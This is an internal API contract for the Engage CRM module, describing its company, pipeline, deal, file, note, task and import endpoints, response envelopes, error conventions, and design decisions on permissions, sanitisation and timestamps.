# Engage CRM — API Contract (Phase 1)

**Ticket:** CRM-004 · **Status:** FROZEN — the frontend is built against this
**Version:** 1.0 · 13 August 2026
**Schemas:** `emailMarketingAPI/api/schemas/main/crm/{common,company,pipeline,deal}.py`
**Companion:** `CRM_MODULE_REQUIREMENTS_PLAN.md` (design rationale) · `CRM_TASK_BREAKDOWN.md` (tickets)

---

## Why this document exists

`src/Utility/crm.js` and every CRM screen are written against these shapes **before** the route implementations land. That is what lets EPIC 7–10 run in parallel with EPIC 4–6 instead of waiting five weeks.

The cost of that parallelism is discipline: **renaming or removing a field here is a breaking change.** If a shape has to move, say so explicitly in the PR description and tell the frontend lead — do not quietly adjust it because the implementation turned out easier a different way.

Additive changes (new optional field) are safe and need no ceremony.

---

## Conventions

**Base path:** `/api/v1/crm` · **Auth:** `Authorization: Bearer <jwt>` · **Account scoping:** optional `X-Account-Id` header

Both headers are attached automatically by `src/Utility/axiosInstances.js`. Never set them by hand in a component.

**Tenancy.** Every record is scoped by `created_by == account_id`. It is never accepted from the client and never settable. Team members read all records in the account; write and delete are narrowed at the record level by ownership plus the `crm:manage_others` grant.

**Pagination.** `skip` (≥0) and `limit` (0–200, default 50). `total` is the count of the **filtered** set, not the page.

**Sorting.** `sort_by` (field name) and `sort_dir` (`asc`|`desc`, default `desc` on `created_at`).

**IDs.** MongoDB ObjectId, serialised as a 24-character hex string in JSON. Unlike Brevo — where company ids are strings, contact ids are integers and deal ids are strings — every id in this API is the same type.

---

## Object ids on the wire

Every record is returned with **`id`**, never `_id`.

The pydantic schemas declare `id: PyObjectId = Field(alias="_id", serialization_alias="id")`
— the alias lets a schema validate straight from a Mongo document, the
serialization_alias controls what the client receives. FastAPI serialises
`response_model` with `by_alias=True` by default, so **without the
serialization_alias every endpoint emits `_id`** while every screen reads
`.id`. That produced a request to `/crm/pipelines/undefined/board` -> 422, from a
frontend and a backend that each looked correct in isolation.

Endpoints that return raw dicts rather than a `*Details` schema (the two
`/activities` endpoints) go through `serializers.public_dump`, which does the
same rename.

`tests/crm_integration/test_wire_format.py` asserts the serialised key, not
the model attribute. Add any new `*Details`-shaped schema to `ID_MAPPED_SCHEMAS`
there.

---

## Response envelopes

Two shapes, both inherited from the rest of Engage. We follow them rather than inventing a third.

**Single object:**

```jsonc
{ "status": "success", "message": "", "data": { /* object */ } }
```

**List:**

```jsonc
{ "data": [ /* objects */ ], "total": 128, "status": "success" }
```

Note the list envelope is **flat** — `data`, `total` and `status` are siblings. There is no nested `data.items`.

---

## Error semantics — read this before writing client code

Three distinct failure shapes exist. This is inherited, not chosen, and it surprises everyone the first time.

| Situation | HTTP | Body |
|---|---|---|
| Business-rule failure raised inside a route body | **200** | `{"status": "failure", "message": "...", "data": null}` |
| **Permission denied** (`PermissionDeniedError`) | **200** | `{"status": "failure", "message": "...", "data": null}` |
| Pydantic validation failure | **422** | `{"messages": [...], "success": false}` |
| Auth failure / expired token | 401 | `{"message": "...", "messages": [...], "success": false}` |
| Unhandled server error | 500 | `{"messages": ["Internal Server Error"], "success": false}` |

**Permission denials are deliberately HTTP 200** so the UI renders the message inline instead of tripping the global 401/403 interceptor and bouncing the user to the login screen.

**Client rule:** `src/Utility/crm.js` normalises all of these into one shape via a single `unwrap()` helper. No screen should ever branch on `res.status` vs `res.data.status`.

> Reminder on the helper asymmetry in `src/Utility/API.js`, which is the most common source of bugs in this codebase:
> `getAllData` returns the **envelope body** → check `res?.status`.
> `addData` / `updateData` / `deleteData` return the **raw axios response** → check `res?.data?.status`.

---

## Endpoints — Phase 1

### Companies

| Method | Path | Permission | Request | Response |
|---|---|---|---|---|
| `GET` | `/crm/companies` | `companies:read` | query params below | `CompanyListResponse` |
| `POST` | `/crm/companies` | `companies:write` | `CompanyCreateRequest` | `ResponseSchema[CompanyDetails]` |
| `GET` | `/crm/companies/{id}` | `companies:read` | — | `ResponseSchema[CompanyDetails]` |
| `PATCH` | `/crm/companies/{id}` | `companies:write` | `CompanyUpdateRequest` | `ResponseSchema[CompanyDetails]` |
| `DELETE` | `/crm/companies/{id}` | `companies:write` | `?hard=false` | `ResponseSchema[None]` |
| `POST` | `/crm/companies/bulk` | `companies:write` | `BulkActionRequest` | `ResponseSchema[BulkActionResult]` |
| `POST` | `/crm/companies/{id}/links` | `companies:write` | `CompanyLinksRequest` | `ResponseSchema[CompanyDetails]` |
| `DELETE` | `/crm/companies/{id}/links` | `companies:write` | `CompanyLinksRequest` | `ResponseSchema[CompanyDetails]` |
| `GET` | `/crm/companies/{id}/contacts` | `companies:read` | `skip`,`limit` | list envelope |
| `GET` | `/crm/companies/{id}/deals` | `companies:read` | `skip`,`limit` | `DealListResponse` |
| `GET` | `/crm/companies/{id}/activities` | `companies:read` | `activity_type`,`skip`,`limit` | list of `ActivityDetails` |

**List query params:** `q` · `owner_id` · `industry` · `tag_ids[]` · `domain` · `has_deals` · `created_from` · `created_to` · `sort_by` · `sort_dir` · `skip` · `limit`

**Two contract rules with teeth:**

1. **`PATCH` never touches associations.** `CompanyUpdateRequest` has no `contact_ids` / `deal_ids` — enforced by the schema, not by convention. Brevo's `PATCH` replaces the linked-id array wholesale, silently unlinking anything absent from the payload; they needed a second endpoint to work around it. We don't ship the footgun. Use `POST`/`DELETE /{id}/links`, which are additive and subtractive respectively.

2. **Duplicate domains warn, they don't block.** `POST` succeeds and returns `data.duplicate_warning`:

```jsonc
{
  "status": "success",
  "data": {
    "id": "...", "name": "Acme Pvt Ltd", "domain": "acme.com",
    "duplicate_warning": {
      "id": "60f7...", "name": "Acme Private Limited",
      "confidence": "high", "matched_on": "domain"
    }
  }
}
```

The UI offers "Open existing" or "Create anyway". Brevo hard-blocks duplicate domains, which breaks subsidiaries, franchises and regional entities on a shared parent domain.

**Domain normalisation** happens server-side: strip scheme, `www.`, port, path and trailing slash, then lowercase. `HTTPS://WWW.Acme.com/about` → `acme.com`. The client may mirror this for the inline warning but the server value is authoritative.

---

### Pipelines

| Method | Path | Permission | Request | Response |
|---|---|---|---|---|
| `GET` | `/crm/pipelines` | `pipelines:read` | — | `PipelineListResponse` |
| `POST` | `/crm/pipelines` | `pipelines:write` | `PipelineCreateRequest` | `ResponseSchema[PipelineDetails]` |
| `GET` | `/crm/pipelines/{id}` | `pipelines:read` | — | `ResponseSchema[PipelineDetails]` |
| `PATCH` | `/crm/pipelines/{id}` | `pipelines:write` | `PipelineUpdateRequest` | `ResponseSchema[PipelineDetails]` |
| `DELETE` | `/crm/pipelines/{id}` | `pipelines:write` | `?migrate_to_pipeline_id=&migrate_to_stage_id=` | `ResponseSchema[None]` |
| `POST` | `/crm/pipelines/{id}/stages` | `pipelines:write` | `StageCreateRequest` | `ResponseSchema[PipelineDetails]` |
| `PATCH` | `/crm/pipelines/{id}/stages/{stage_id}` | `pipelines:write` | `StageUpdateRequest` | `ResponseSchema[PipelineDetails]` |
| `DELETE` | `/crm/pipelines/{id}/stages/{stage_id}` | `pipelines:write` | `?move_deals_to_stage_id=` | `ResponseSchema[PipelineDetails]` |
| `PUT` | `/crm/pipelines/{id}/stages/reorder` | `pipelines:write` | `StageReorderRequest` | `ResponseSchema[PipelineDetails]` |

`GET /crm/pipelines` **auto-provisions** the default pipeline when an account has none, so the client never has to handle an empty CRM. Calling it twice does not create two.

Every stage mutation returns the **whole pipeline**, so the client always has a consistent stage array and never has to merge partial updates.

**Invariants the server enforces** (`stage_rules.py`, CRM-013):

- 3 ≤ stages ≤ 20
- exactly one `won` and one `lost` stage, always ordered last, never deletable
- stage names unique per pipeline (case-insensitive); pipeline names unique per account
- `order` contiguous 0..n-1 after every mutation
- `win_probability` forced to 100 on won, 0 on lost
- exactly one default pipeline per account
- a pipeline holding deals cannot be deleted; the default pipeline cannot be deleted at all

---

### Deals

| Method | Path | Permission | Request | Response |
|---|---|---|---|---|
| `GET` | `/crm/deals` | `deals:read` | query params below | `DealListResponse` |
| `POST` | `/crm/deals` | `deals:write` | `DealCreateRequest` | `ResponseSchema[DealDetails]` |
| `GET` | `/crm/deals/{id}` | `deals:read` | — | `ResponseSchema[DealDetails]` |
| `PATCH` | `/crm/deals/{id}` | `deals:write` | `DealUpdateRequest` | `ResponseSchema[DealDetails]` |
| `DELETE` | `/crm/deals/{id}` | `deals:write` + ownership | — | `ResponseSchema[None]` |
| **`PATCH`** | **`/crm/deals/{id}/stage`** | `deals:write` | `DealStageChangeRequest` | `ResponseSchema[DealDetails]` |
| `POST` | `/crm/deals/{id}/close` | `deals:write` | `DealCloseRequest` | `ResponseSchema[DealDetails]` |
| `POST` | `/crm/deals/{id}/reopen` | `deals:write` | `DealReopenRequest` | `ResponseSchema[DealDetails]` |
| `POST` | `/crm/deals/bulk` | `deals:write` | `BulkActionRequest` | `ResponseSchema[BulkActionResult]` |
| `POST` | `/crm/deals/{id}/links` | `deals:write` | `DealLinksRequest` | `ResponseSchema[DealDetails]` |
| `DELETE` | `/crm/deals/{id}/links` | `deals:write` | `DealLinksRequest` | `ResponseSchema[DealDetails]` |
| `GET` | `/crm/deals/{id}/activities` | `deals:read` | `activity_type`,`skip`,`limit` | list of `ActivityDetails` |

**List query params:** `q` · `pipeline_id` (or `all`) · `stage_id` · `status` · `owner_id` · `company_id` · `contact_id` · `tag_ids[]` · `amount_min` · `amount_max` · `close_date_from` · `close_date_to` · `has_overdue_task` · `is_rotting` · `sort_by` · `sort_dir` · `skip` · `limit`

**`PATCH /crm/deals/{id}` cannot change the stage.** `DealUpdateRequest` has no `stage_id` — enforced by the schema. A request carrying one is rejected with a message pointing at the stage endpoint. This guarantees stage-rule validation, fractional positioning and activity recording can never be bypassed.

---

### `PATCH /crm/deals/{id}/stage` — the drag-and-drop endpoint

Request:

```jsonc
{
  "stage_id": "60f7c2b3c2a5f3e9a4d2a1c1",
  "pipeline_id": null,                 // only when moving across pipelines
  "before_deal_id": "60f7...",         // card above the drop point
  "after_deal_id": "60f7..."           // card below it — omit both to append
}
```

The server derives the fractional `position` from the neighbours: midpoint between them, `first − 1000` at the top, `last + 1000` at the bottom.

**Success** returns the updated deal so the board can reconcile counts and totals from the server rather than trusting its optimistic local state.

**Rejection for missing required attributes** — the case the UI must handle carefully:

```jsonc
{
  "status": "failure",
  "message": "Deal stage 'Proposal sent' requires: Amount, Expected close date.",
  "data": { "missing_attributes": ["Amount", "Expected close date"] }
}
```

`missing_attributes` carries the attributes' **display labels**, not their
`internal_name`s — `missing_required_attributes` resolves each name through the
account's attribute labels (falling back to a humanised form of the internal
name). They are meant to be rendered verbatim. A client that maps them back to
field keys is coupling itself to whatever the account named its attributes.

**The response envelope must admit this shape.** `data` here is a
`StageChangeRejection`, not a `DealDetails`, so the route is declared
`ResponseSchema[Union[DealDetails, StageChangeRejection]]`. Declared as
`ResponseSchema[DealDetails]` alone, FastAPI's outbound response validation
raises `ResponseValidationError` and this rejection becomes a **500** — which
is exactly what happened, and it made the fill-in dialog unreachable.

HTTP is **200**. The deal is left **completely unmodified** — no partial write, no stray activity. The client reverts the card to its exact original column *and index*, then opens the fill-in dialog listing the fields the **server** named. The client must not compute that list itself, or the two can disagree.

**Moving into a `won` or `lost` stage through this endpoint is rejected** — use `/close`, which captures amount, close date and reason atomically.

---

### `GET /crm/pipelines/{pipeline_id}/board` — the Kanban payload

Query: `owner_id` · `q` · `close_date_from` · `close_date_to` · `tag_ids[]` · `has_overdue_task` · `cards_per_stage` (default 25, max 100)

One request paints the board.

```jsonc
{
  "status": "success",
  "data": {
    "pipeline": {
      "id": "60f7c2b3c2a5f3e9a4d2a1c0",
      "name": "Sales Pipeline",
      "currency": "INR",
      "weighted_forecast_enabled": true
    },
    "totals": { "deal_count": 128, "total_value": 4820000.0, "weighted_value": 1633500.0 },
    "stages": [
      {
        "id": "60f7c2b3c2a5f3e9a4d2a1c1",
        "name": "Qualifying",
        "order": 1,
        "type": "open",
        "win_probability": 15,
        "color": "#4a90d9",
        "required_attributes": [],
        "deal_count": 24,
        "total_value": 385300.0,
        "weighted_value": 57795.0,
        "has_more": false,
        "deals": [
          {
            "id": "60f7c2b3c2a5f3e9a4d2a1c2",
            "name": "Acme — annual renewal",
            "amount": 45000.0,
            "currency": "INR",
            "position": 3000.0,
            "expected_close_date": "2026-09-30T00:00:00Z",
            "owner": { "id": "...", "name": "Priya S", "avatar_url": null },
            "primary_company": { "id": "...", "name": "Acme Pvt Ltd", "domain": "acme.com" },
            "contact_count": 3,
            "tags": [ { "id": "...", "name": "Enterprise", "color": "#009284" } ],
            "open_task_count": 2,
            "overdue_task_count": 1,
            "next_activity_at": "2026-08-14T09:30:00Z",
            "is_rotting": false,
            "custom_fields": { "deal_source": "Inbound" }
          }
        ]
      }
    ]
  }
}
```

**Guarantees the client may rely on:**

- Stages arrive in `order`; cards arrive in ascending `position`.
- Filters apply to the per-stage counts and sums too, so a column header can never disagree with the cards beneath it.
- `is_rotting` is computed server-side from `stage_entered_at` and the stage's `rotting_days`. **The UI must not recompute it** — the rule lives in one place.
- `weighted_value` = Σ `amount × (deal.probability ?? stage.win_probability) / 100`, rounded once at the end.
- No N+1: owner, company and tag expansion is batched in a single lookup.
- Performance budget: p95 < 500 ms for 1,000 deals across 10 stages (NFR1).

**Per-column paging:** `GET /crm/pipelines/{id}/board/stages/{stage_id}/deals?skip=&limit=` — preserves the board's active filters and `position` ordering across page boundaries. Brevo hard-caps its Cards view at 1,000 deals; we page instead.

---

### Files

| Method | Path | Permission | Request | Response |
|---|---|---|---|---|
| `GET` | `/crm/files?deal_id=` / `?company_id=` / `?contact_id=` | *inherited* | — | `FileListResponse` |
| `POST` | `/crm/files` | *inherited* | multipart: `file`, `entity_type`, `entity_id` | `ResponseSchema[FileDetails]` |
| `GET` | `/crm/files/{id}/download` | *inherited* | — | `{url, filename, expires_in}` |
| `DELETE` | `/crm/files/{id}` | *inherited* | — | `ResponseSchema[None]` |

Permissions inherit the parent record, exactly as notes do.

**Objects are private and there is no permanent URL.** A download is two steps:
ask for a signed URL, then follow it. The URL expires in 5 minutes, and tenancy
plus the parent-record permission are checked **before** it is minted — a signed
URL is a bearer token for the object, so a check after signing is not a check.
This is deliberately unlike `api/services/asset_storage.py`, which writes
world-readable objects with permanent URLs; that is right for a marketing image
and wrong for a customer's contract.

**The file type is decided by its bytes, not its name or its Content-Type.**
`invoice.pdf` containing HTML is refused. `storage_key` is random, account
prefixed, and never returned to a client. SVG and HTML are refused outright —
they can carry scripts, and an image format that executes is not an image
format. Cap is 10 MB, enforced while streaming.

---

### Notes

| Method | Path | Permission | Request | Response |
|---|---|---|---|---|
| `GET` | `/crm/notes?deal_id=` / `?company_id=` / `?contact_id=` | *inherited* | — | `NoteListResponse` |
| `POST` | `/crm/notes` | *inherited* | `NoteCreateRequest` | `ResponseSchema[NoteDetails]` |
| `PATCH` | `/crm/notes/{id}` | *inherited*, author only | `NoteUpdateRequest` | `ResponseSchema[NoteDetails]` |
| `DELETE` | `/crm/notes/{id}` | *inherited* | — | `ResponseSchema[None]` |
| `POST` | `/crm/notes/{id}/pin` · `/unpin` | *inherited* | — | `ResponseSchema[NoteDetails]` |

**There is no `notes:*` permission.** A note inherits its parent's: a note on a
deal needs `deals:read` to see and `deals:write` to write. A separate note
permission would be a trap — grant someone deal access, forget the note grant,
and half the deal's history silently disappears. The route is gated with
`require_any(...)` so a role holding only one parent's permissions can reach it;
the handler then checks the specific parent.

A note may attach to several records at once, and access to **any one** of them
is enough. Requiring all of them would hide a note from someone who can
legitimately see the deal it is on, because it also mentions a contact they
cannot.

**`body` is sanitised server-side before storage**, to the allow-list
`p br b i u strong em ul ol li a[href]`. Sanitisation is on the way IN, not on
render: a client that skips our UI must not be able to *store* a script tag,
because stored hostile HTML is one careless consumer away from executing — an
export, a digest email, a PDF, an admin tool. `NoteDetails.preview` is plain
text for titles and list rows; never render it as HTML.

Only the author may `PATCH` a note — those are their words under their name.
Anyone with write access may delete one, which keeps moderation possible.

---

### Tasks

Tasks have their **own** permission — `crm_tasks:read` / `crm_tasks:write` —
unlike notes and files, which inherit the parent record's. That is deliberate:
a note is *about* a deal, but a task is assigned to a person, and "can work the
task queue without being able to edit records" is a real role (`agent` in the
RBAC catalogue). The linked deal or company is **not** re-checked.

| Method | Path | Permission |
|---|---|---|
| `GET` / `POST` | `/crm/tasks` | `crm_tasks:read` / `:write` |
| `GET` / `PATCH` / `DELETE` | `/crm/tasks/{id}` | |
| `POST` | `/crm/tasks/{id}/complete` | `crm_tasks:write` |
| `POST` | `/crm/tasks/bulk` | `crm_tasks:write` |
| `GET` | `/crm/task-types` | `crm_tasks:read` |

**List query params:** `status` (`todo`\|`done`\|`all`), `assigned_to_id`,
`assigned_to_me`, `task_type`, `priority`, `due`, `due_from`, `due_to`,
`deal_id`, `company_id`, `contact_id`, `search`, `sort_by`, `sort_dir`, `skip`,
`limit`, `with_counts`.

#### `due` resolves in the ACCOUNT's timezone, not the server's or the browser's

`due=overdue|today|tomorrow|week|later|no_due_date|range`. The boundaries are
computed in `crm_settings.timezone` (default `Asia/Kolkata`).

**"Today" is the most timezone-sensitive word in this API.** A task due at
00:30 IST is 19:00 UTC *the previous day*; a naive UTC filter reports it as
missed before it is even due. So:

* every row carries a server-computed **`due_bucket`** and **`is_overdue`** —
  the client must not re-derive either. The browser's clock is not the
  account's, and two implementations of "today" is how a row ends up under a
  heading it does not belong to;
* `overdue` means *strictly before now*, not "before midnight";
* `today` starts at **now**, so an already-missed task is in `overdue` and not
  in both;
* `week` means the next seven days, not the calendar week (on a Friday, a
  calendar week means two days);
* `week` is a **filter**, not a partition slot: selecting it returns rows
  labelled `today`, `tomorrow` and `week`. That is intended.

#### Prefer `assigned_to_me=true` to sending your own user id

The server resolves it from the token. A client that reads the current user out
of its own store and gets it wrong shows someone another person's task list,
and nothing about that looks broken. An explicit `assigned_to_id` still wins,
so "everyone's tasks, filtered to one person" works.

#### `with_counts=true` adds `bucket_counts`

A sibling of `data` in the envelope, like `total`. Open-task counts per bucket,
built from the **same** filter as the list — so a group heading cannot disagree
with the rows under it.

```json
{ "data": [...], "total": 12,
  "bucket_counts": { "overdue": 3, "today": 4, "tomorrow": 1,
                     "week": 2, "later": 1, "no_due_date": 1 },
  "status": "success" }
```

#### Completing is idempotent

`POST /crm/tasks/{id}/complete` on an already-completed task returns
`status: "success"` and does **not** move `completed_at` or write a second
activity. The checkbox is the most double-clicked control in any task list, and
the request is often retried on a flaky connection.

To **reopen**, `PATCH` with `is_done: false` — `/complete` is deliberately
one-way. Reopening clears `completed_at` and `completed_by_id`.

#### `PATCH`: an explicit `null` is an edit

`due_at: null` **clears** the due date; omitting the field leaves it alone.
Absent and null are distinguished via `model_fields_set`. A reminder requires a
due date to count back from — setting one without is a business failure.

#### `POST /crm/tasks/bulk`

`{ "task_ids": [...], "action": "complete|assign|reschedule|delete",
   "assigned_to_id": ..., "due_at": ... }`

`assign` without an assignee and `reschedule` without a date are **422s**, not
silent clears. The response reports per-id outcomes rather than a bare count:

```json
{ "status": "success",
  "data": { "updated": 17, "failed_ids": ["..."],
            "message": "3 of 20 could not be updated." } }
```

#### Counters on deals and companies

`open_task_count`, `overdue_task_count` and `next_activity_at` are maintained
by `$inc` on every task write. They are **display-only** and never read by
business logic, so drift shows a wrong badge and never causes wrong behaviour.
They *will* drift; `scripts/reconcile_crm_task_counters.py` fixes them nightly.

### File preview: `?disposition=inline`

`GET /crm/files/{id}/download` takes `disposition`, either `attachment` (the
default — save it) or `inline` (render it in the browser). Same endpoint, same
tenancy and parent-permission checks, same short TTL; a second endpoint would
be a second place for any of those to be forgotten.

A preview **cannot** reuse the download URL: that one carries
`Content-Disposition: attachment`, which makes the browser save the file
however it is opened.

`inline` is **refused** for families a browser cannot show — zip and Office —
with a sentence naming the kind of file and telling the user to download it.
That is a real refusal, not a courtesy: an inline URL for a `.docx` behaves
differently on every machine, so the preview button would do something
different for each user. The response also carries `content_type`, which is
what a client should pick its renderer from — never the filename, since the
server sniffs the type from the bytes precisely because the extension cannot
be trusted.

`inline` is only safe because **SVG and HTML are refused at upload**, by
extension and by magic bytes. If either is ever allowed, `inline` must be
withdrawn for it in the same change: an inline SVG served from the API's own
origin is a session-stealing XSS. The local dev route (`/crm/files/local/…`)
additionally sends `X-Content-Type-Options: nosniff`, because that path serves
from the API's own origin rather than from a bucket.

### Timestamps are UTC with NO offset

⚠️ **Every datetime in a CRM response is UTC and carries no `Z` and no
offset** — `occurred_at`, `created_at`, `updated_at`, `due_at`, all of them:

```jsonc
{ "occurred_at": "2026-10-23T12:34:56.789" }   // UTC. Not local. No marker.
```

The reason is the Motor client, which is built without `tz_aware=True`, so
PyMongo hands back naive datetimes and the value loses its tzinfo on the way
out. `stage_rules._as_utc` documents the same thing on the server side, where
subtracting one of these from an aware `datetime.now(timezone.utc)` raises.

**A client must parse these as UTC explicitly.** `new Date(s)` and `dayjs(s)`
read an offset-less string as LOCAL time, so in IST the instant lands 5 hours
30 minutes early. That is not hypothetical: the CRM activity timeline showed
"5h ago" against a task created moments earlier, and the timestamp beside it
printed the raw UTC numbers as though they were already local. The web client
now funnels every parse through one helper
(`src/Utility/functions/timestampZone.js`) for exactly this reason.

Emitting the offset server-side would be the better fix and is not done:
it changes the wire format of every datetime in every CRM response at once,
and the client is correct now. Worth doing deliberately, with this note
deleted in the same change.

### Imports

**`entity_type` is one of `company`, `deal`, `contact` or `note`.** Contacts
became importable in CRM-412 (into the CRM's own `crm_contacts` collection, not
the platform one — see "Why the platform contact collection is still not
importable" below); notes in CRM-413.

| Method | Path | Permission |
|---|---|---|
| `POST` | `/crm/imports/preview` | any CRM write |
| `POST` | `/crm/imports` | same |
| `GET` | `/crm/imports` · `/crm/imports/{id}` | any CRM read |
| `POST` | `/crm/imports/{id}/cancel` | any CRM write |
| `GET` | `/crm/imports/{id}/errors` | any CRM read |

"Any CRM write" is `companies:write · deals:write · contacts:write`, and the
route-level gate is deliberately that wide: its job is to keep a caller with no
CRM write access out entirely, and **which** type may be imported is decided
per request against `ENTITY_PERMISSIONS`. Demanding `companies:write` here (as
this did until CRM-413) meant a deals-only or contacts-only role could not
reach an import of its own records at all — a hole no per-entity check could
see, because the dependency refuses the request before the handler runs.

Each type's own permission is the one a single create needs — an import is a
bulk create, so nothing weaker. A **note** is the exception and holds no
permission of its own: it inherits its parent's, exactly as `POST /crm/notes`
does, so any CRM write starts a note import and each ROW is then checked
against the record it names. A caller with `deals:write` alone imports the
deal rows of a mixed file and has the company rows reported back.

#### The server parses the file; the client must not

`POST /crm/imports/preview` takes multipart `file` + `entity_type` and returns
the detected format, the columns with sample values, and a suggested mapping.

Encoding and delimiter are **detected, never assumed** — Excel's "CSV UTF-8"
carries a BOM, its "Unicode text" is UTF-16 tab-separated, a European Excel
writes semicolons, and older systems write cp1252. `.xlsx` is detected from the
file's bytes, not its extension, and formula cells yield their cached *value*.

The response reports what was detected (`file_format`, `encoding`, `delimiter`)
so the UI can show it. Do not parse the file client-side as well: two answers to
"what does this file say" means the mapping the user reviewed is not the one
that runs.

#### Mapping is positional

`mapping` is a JSON array with **one entry per column**, `null` to skip.
Positional rather than keyed by header text, because files with two
identically-named columns are common and a keyed mapping silently drops one.

`suggested` is an exact match on internal name, label, or a known synonym —
never fuzzy. A plausible-but-wrong guess costs more than a blank one, because
the user reviews a screen of pre-filled dropdowns and trusts them.

#### Options

`{ update_existing, dedupe_key: "domain"|"name", unset_empty_attributes,
link_entities, default_owner_id }`

- `update_existing` without a `dedupe_key` is a **422** — with nothing to match
  on it would silently create every row, which is the opposite of the request
  and invisible until someone counts the records.
- Matching is **exact after normalisation**, never fuzzy. `find_duplicates`
  scores near misses for the duplicate *warning*, where a human judges them;
  here the result silently overwrites a record.
- `unset_empty_attributes` off (the default) means a blank cell leaves the
  existing value alone, so a file containing only the columns you meant to
  change works as expected. On, a blank cell clears the field.
- `link_entities` on a deal import links to a company named in the file and
  **creates it if it does not exist**. Those are counted separately as
  `linked_created_count` and reported — importing 200 deals can produce 180
  companies, and that should not be a discovery.

#### Progress and errors

`GET /crm/imports/{id}` returns `percent` and `is_finished` computed
server-side. Poll on `is_finished`, not on the status string: a status this
client has not heard of would otherwise poll for ever.

`GET /crm/imports/{id}/errors` returns a **CSV file, not the envelope** — the
browser downloads it. It is UTF-8 with a BOM so Excel reads accents correctly,
and its first column is the **original row number from the source file**, so it
lines up beside the file the user is fixing. `X-Error-Count` is exact even when
the rows in the body are capped (`X-Errors-Truncated`).

The endpoint is auth-guarded, so fetch it as a blob — a plain `<a href>` does
not carry the bearer token and just 401s.

#### Cancel does not roll back

`POST /crm/imports/{id}/cancel` sets a flag the worker reads between batches.
An import is **not a transaction**: the rows already written stay written, and
the response and `committed_at_cancel` say how many. Cancelling an import that
has already finished is a success, not an error — the user lost a race, they
did not make a mistake.

A row that fails does not abort the import; it is counted and recorded with its
row number, and the run finishes as `completed_with_errors`.

#### Notes attach by reference, and a reference that does not resolve is an error

A note file maps a `body` column plus at least one of `company_id`, `deal_id`,
`contact_id` or `contact_email`; both rules are checked **before** the run
starts, because a file missing one of them would otherwise produce one
identical error per row in a report of nine thousand.

Four things about a note import are worth knowing from the outside:

* **An unresolved reference is a reported row error naming it**, never a note
  attached to nothing. A parentless note is invisible — `GET /crm/notes`
  requires a record to list for and no screen enumerates notes — so a file
  whose ids came from another account's export would otherwise import
  "successfully" and appear nowhere. Every lookup is account-scoped.
* **An unknown `contact_email` does not create a contact.** The company
  resolver *does* create a company a deal or contact row names, because the row
  asserts it exists and the record needs somewhere to hang. A note is the
  opposite: it is history about someone, and inventing a nameless person from
  an address in a note file would add a contact nobody put there.
* **The body goes through the same `sanitise` call `POST /crm/notes` makes.**
  An import is not a sanitisation bypass. A cell containing no markup has its
  line breaks converted to `<br>` first, since a spreadsheet cell's line breaks
  are the only structure it has and HTML collapses them.
* **Imported notes are never pinned**, whatever the file says. A pin is shared
  state — "the team reads this first" — and 900 historical notes honouring a
  `pinned` column would bury the one note somebody pinned on purpose.

`update_existing` is refused for notes: there is no key that identifies "the
same note" (two identical call summaries a week apart are two notes), so the
option would have nothing to match on, and ignoring it silently would leave the
caller believing a re-import had edited notes in place rather than doubling
them.

#### Why the platform contact collection is still not importable

CRM contacts **are** importable (CRM-412): they live in `crm_contacts`, which
is tenanted on `created_by` with a per-account unique email index. What follows
is about the *platform* `Contact` model, which an import still never writes.

`Contact.email` carries a **globally unique** index, and the platform uses it
deliberately: at least eight code paths find a contact by email across all
accounts and append the current account to `owner_ids`, so **one contact
document is shared between accounts**. Around 28 queries look contacts up by
email with no account filter, which is correct only while that index holds.

Per-account contacts is therefore a data-model change — fork the shared rows,
rewrite those paths, repoint `contact_id` across five collections — affecting
campaigns, lists, segments and bounce handling, not just the CRM. It is tracked
as CRM-P2-000 and is not part of this epic.

⚠️ **THE CRM HAS ITS OWN PEOPLE OBJECT AGAIN, AND THIS SECTION HAS NOW
REVERSED TWICE.** `/crm/contacts` shipped (E25), was removed on 23 Oct 2026,
and is restored here — the eight endpoints are in the generated table below.
The removal's reasoning is kept above because it is still correct about the
platform contact; what changed is the conclusion drawn from it.

The strike-through notes that used to sit here are gone with it. They were
there because `check_crm_contract.py` reads a prose mention as a claim that an
endpoint exists and subtracts a struck-through one — so leaving them would
cancel the table rows below and the checker would report eight endpoints as
undocumented while the document appeared to list them. If `/crm/contacts` is
ever removed a third time, that is the mechanism to use.

⚠️ **~~`POST /crm/contacts/promote`~~ IS GONE AS OF PHASE 5** (decision 0.3). It
took up a platform contact as a CRM-owned person — an operation that only
means something while there are two populations. On the unified path every
marketing contact is already reachable, and the profile is created by editing
one. Its UI call sites went in the same release, including the one on the DEAL
page (`DealDetails.jsx`), which is the one nobody expected.

Two endpoints from the ORIGINAL object are still gone, and deliberately:
~~`POST /crm/contacts/{id}/link`~~ and ~~`DELETE /crm/contacts/{id}/link`~~.
They attached a CRM contact to a platform Contact, and that seam is what
produced two populations of the same person with no rule about which was
authoritative. A CRM contact is a `crm_contacts` row, full stop.

**THERE ARE NOW TWO CONTACT LISTS, AND THEY ARE DIFFERENT THINGS.** The
marketing audience at `/api/v1/contacts` is who you may email; `/crm/contacts`
is who sales is working. A CRM contact is **not marketable** — it cannot be
added to a list or emailed from the CRM. To market to one, it is imported into
the audience as a contact in its own right, where it gets its own consent
record.

⚠️ **AND THAT IS BEING REVERSED, BEHIND A FLAG.** The paragraph above
describes the LEGACY path and stays true while
`crm_settings.unified_contacts` is false. With the flag on, `/crm/contacts`
serves the platform contact joined to a per-account `crm_contact_profiles`
row: one person, one id space, marketing and CRM alike. See
`docs/contact-unification-plan.md`. The response model does not change —
`ContactDetails` carries the same keys on both paths, deliberately, so a
client cannot tell which it is talking to.

Two differences a caller can see on the unified path:

- `GET /crm/contacts/{id}` takes a **platform contact id**, and a contact with
  no CRM profile is returned with empty relationship fields rather than 404 —
  that is a marketing contact nobody has worked yet.
- `GET /crm/contacts` accepts **`scope=worked|all`** (default `worked`).
  `all` lists the whole marketing audience and refuses `owner_id`,
  `company_id`, `lifecycle_stage`, `tag_ids` and `filters` with a 'failure'
  envelope — those describe a CRM relationship and only exist for worked
  contacts. The parameter is ignored on the legacy path, which has one
  population.

**CRM-406 is therefore answered, and by the row rather than by a rule.**
`AssociationEntity` has two contact members:

| `to_type` | `to_id` lives in | written by |
|---|---|---|
| `contact` | the platform `contacts` collection | everything up to 23 Oct 2026, and `EntityPicker` still |
| `crm_contact` | the CRM's `crm_contacts` | the CRM's own screens, from now on |

So there is no question to decide at read time and **no migration at all**:
existing rows keep resolving against the platform, new ones against the CRM,
and each id is looked up in exactly one collection. The ambiguity CRM-406 was
parked on — *"a contact row could hold either a platform id or a CRM one
depending on which screen wrote it"* — is removed by making the two cases
different rows rather than by moving data.

